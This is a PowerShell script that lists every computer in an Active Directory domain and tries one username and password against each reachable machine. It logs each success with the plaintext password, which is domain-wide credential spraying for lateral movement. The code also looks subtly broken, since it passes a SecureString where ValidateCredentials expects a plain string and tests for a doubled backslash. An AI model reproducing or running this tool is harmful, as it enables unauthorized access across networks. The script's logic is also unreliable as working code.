[CmdletBinding()] Param(

        [parameter(Mandatory = $True)]
        [String] $UserName,

        [parameter(Mandatory = $True)]
        [String] $Password

    )

    Begin {
        Set-StrictMode -Version 2
        #try to load assembly
        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
    }

    Process {

        $ComputerNames = @()
        
        Write-Verbose "Searching the domain for active machines."
        "Searching the domain for active machines."

        $ComputerNames = [array] ([adsisearcher]'objectCategory=Computer').Findall() | ForEach {$_.properties.cn}

        Write-Verbose "Retrived $($ComputerNames.Length) systems from the domain."
	"Retrived $($ComputerNames.Length) systems from the domain."

        foreach ($Computer in $ComputerNames){     

            Try {
                
                Write-Verbose "Checking: $Computer"
                $up = Test-Connection -count 1 -Quiet $Computer 

                if($up){

                    if ($Username.contains("\\")) {
                        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                    }
                    else{
                        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
                    }

		
		$pc = New-Object DirectoryServices.AccountManagement.PrincipalContext($ContextType,$Computer)
		$secString = ConvertTo-SecureString $Password -AsPlainText -Force
#		Write-Host "$secString"
#		Write-Host "$($pc.ValidateCredentials($Username, $Password))"
		try {
		    if($pc.ValidateCredentials($Username, $secString)) {
                        Write-Verbose "[+] SUCCESS: $Username works with $Password on $Computer"
				"[+] SUCCESS: $Username works with $Password on $Computer"

                        $out = new-object psobject
                        $out | add-member Noteproperty 'ComputerName' $Computer
                        $out | add-member Noteproperty 'Username' $Username
                        $out | add-member Noteproperty 'Password' $Password
                        $out

		    }
		    else {
                        Write-Verbose "[-] FAILURE: $Username did not work with $Password on $Computer"
			"[-] FAILURE: $Username did not work with $Password on $Computer"
 		    }
		}
		finally {
		    $pc.Dispose()
	       }
             }
           }
          Catch {Write-Error $($Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage)}
       }
    }